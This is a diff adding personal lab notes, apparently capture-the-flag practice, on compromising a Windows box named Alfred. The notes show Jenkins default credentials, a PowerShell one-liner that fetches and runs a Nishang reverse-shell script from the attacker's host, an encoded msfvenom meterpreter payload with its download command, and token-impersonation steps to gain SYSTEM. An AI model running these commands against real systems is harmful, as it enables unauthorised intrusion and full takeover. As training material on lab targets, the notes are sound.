@@ -482,3 +482,71 @@ sc start AdvancedSystemCareService9
 ```
 
 Your shell will pop on your listener.
+
+### Day 3 - more practice
+
+#### Alfred
+
+We run `nmap -sC -sV -T4 -Pn -p- target`:
+```
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Site doesn't have a title (text/html).
+3389/tcp open  ssl/ms-wbt-server?
+8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+Jenkins on port 8080 uses default credentials: `admin:admin`.
+
+Download [Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/c3fdf5e5dfa8612d0a17636dbb096b04e987ab31/Shells/Invoke-PowerShellTcp.ps1) then start a local HTTP server:
+`sudo python3 -m http.server 80`
+
+Start a listener on port 7777: `nc -lnvp 7777`.
+
+Put this into the Jenkins project configuration under command:
+```
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.2.58/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.2.58 -Port 7777
+```
+
+Now we have a shell!
+
+
+#### The Metasploit way
+
+Let's generate a payload:
+```
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.2.58 LPORT=1337 -f exe -o beans.exe
+```
+
+```
+powershell -c (New-Object System.Net.WebClient).Downloadfile('http://10.11.2.58/beans.exe','beans.exe')
+```
+
+Make sure to have your multi/handler running on the correct port.
+
+After that you can basically just migrate to an NT AUTHORITY/SYSTEM process and have Administrator priviledges.
+
+Other than that you can use load incognito and abuse bruce's priviledges.
+
+```
+list_tokens -g
+impersonate_token "BUILTIN\Administrators"
+```
+
+After that migrate.
+
+### Day 4 - More to learn
+
+#### Hackpark - Metasploit
+*to be written*
+
+#### Hackpark - Manual
+
